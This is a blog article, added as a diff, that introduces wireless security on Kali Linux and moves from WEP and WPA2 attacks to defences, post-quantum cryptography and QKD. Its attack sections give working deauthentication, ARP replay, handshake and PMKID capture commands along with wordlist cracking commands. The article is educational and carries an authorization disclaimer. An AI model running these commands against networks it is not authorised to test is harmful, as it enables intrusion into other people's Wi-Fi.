@@ -1,0 +1,119 @@
+---
+title: "Kali Linux and Network Security: From Command Lines to Post-Quantum Cryptography"
+subtitle: "Series: Wireless Network Security — Part 1"
+summary: "From WEP to WPA3, monitor mode and handshake attacks to post-quantum cryptography and QKD — a technical journey through wireless security and what comes next."
+image: "/Medium-blog.png"
+publishedAt: "2025-03-01"
+tag: "Cybersecurity"
+---
+
+> **Disclaimer:** All techniques described in this article are intended solely for use on **your own network or systems for which you have explicit written authorization.** Unauthorized access to networks is illegal.
+
+---
+
+## Introduction
+
+Most wireless security articles follow the same template: install aircrack-ng, capture a handshake, run a wordlist, done. I want to break that mold.
+
+Yes, I'll show you the commands and explain the attack vectors. But the central question is: **What did we learn on the road from WEP to WPA3 — and how will quantum computers reshape the picture?**
+
+---
+
+## 1. Essential Commands
+
+Core commands for Kali: navigation, services, and network status.
+
+```bash
+pwd; ls -la /etc/network/
+find / -name "*.cap" 2>/dev/null
+systemctl stop NetworkManager   # Before monitor mode
+ip a; ip route show; ss -tulnp
+```
+
+---
+
+## 2. Monitor Mode and Discovery
+
+```bash
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
+# Verify: iwconfig wlan0mon
+
+sudo airodump-ng wlan0mon
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
+```
+
+Output shows BSSID, ESSID, signal, encryption (WEP/WPA/WPA2/WPA3), and auth method (PSK/MGT).
+
+---
+
+## 3. WEP: A Technology That Belongs in a Museum
+
+WEP (1997) used RC4 and a 24-bit IV. 2^24 ≈ 16M combinations — on a busy network, IVs repeat within hours. Same IV + same key → plaintext leak (FMS attack).
+
+```bash
+sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
+# No traffic? Fake auth + ARP replay:
+sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF wlan0mon
+sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon
+sudo aircrack-ng wep_capture-01.cap
+```
+
+**Takeaway:** WEP was broken in 2001; WPA2 arrived in 2004. Yet millions of WEP networks persisted for years. Technological transition is slower than mathematical collapse.
+
+---
+
+## 4. WPA/WPA2: Stronger, One Weak Spot
+
+WPA2 uses CCMP/AES but in PSK mode exposes the **4-way handshake** — unencrypted over the air. Capture it → offline brute-force. **PMKID attack (2018):** extract from the AP’s first EAPOL frame, no client needed.
+
+```bash
+# Force handshake
+sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CC:DD:EE:FF:00:11 wlan0mon
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
+
+# Or PMKID + hashcat
+hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
+hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng
+hashcat -m 22000 pmkid.hc22000 wordlist.txt
+```
+
+**Critical:** Success depends on **password quality**. A random 20+ character password not in wordlists can take years to crack even with a GPU.
+
+---
+
+## 5. Defensive Measures
+
+- **Strong passwords:** 16+ chars, random, not dictionary-based  
+- **WPA3 / 802.1X:** SAE or certificate-based auth — handshake/PMKID attacks become irrelevant  
+- **VLAN segmentation, HSTS/HTTPS, Dynamic ARP Inspection (DAI)** on managed switches  
+
+---
+
+## 6. The Quantum Threat and Post-Quantum Cryptography
+
+**Current picture:** WPA2 uses AES-128 (symmetric); RSA/ECC rely on problems “hard” for classical computers. **Shor’s algorithm** can break RSA in polynomial time on a quantum computer; **Grover’s** reduces symmetric search by a square root (AES-128 → ~64-bit; use AES-256). **“Harvest now, decrypt later”** is already a real threat: recorded traffic can be decrypted once quantum computers mature.
+
+**NIST PQC (2022–2024):** CRYSTALS-Kyber (KEM), CRYSTALS-Dilithium and SPHINCS+ (signatures). WiFi doesn’t include PQC yet, but WPA3-Enterprise supports 192-bit mode; PQC over TLS/IPsec is feasible today (OpenSSL 3.x, liboqs).
+
+---
+
+## 7. QKD: Security from Physics
+
+**Quantum Key Distribution (QKD)** relies on the laws of quantum mechanics: measuring a state disturbs it (e.g. BB84). Eavesdropping is detectable. Downsides: cost, limited range (~100–150 km), quantum repeaters not mature; authentication still uses classical crypto. China’s Micius demonstrated QKD over 1,200 km; wireless integration is still 10–15+ years away.
+
+---
+
+## 8. Routers and IoT
+
+Default credentials, unpatched firmware, weak RNG, unsigned firmware — all common. **Checklist:** change default password (20+ chars), enable WPA3 or WPA2-Enterprise, disable WPS and remote management, update firmware, isolate guest network, disable UPnP/Telnet/FTP where not needed.
+
+---
+
+## Conclusion
+
+Security is a moving target. WEP was “good enough” in its time; WPA2-PSK is fine today with a strong password. The quantum threat may feel distant, but infrastructure changes take years — **preparation should start now.**
+
+**Series:** Part 2 — WPA3 SAE & Dragonblood; Part 3 — 802.1X/EAP-TLS; Part 4 — CRYSTALS-Kyber; Part 5 — QKD/BB84 in Python.
+
+**Tags:** `Kali Linux` `Cybersecurity` `WiFi Security` `Post-Quantum Cryptography` `WPA3` `QKD` `Ethical Hacking` `Network Security`
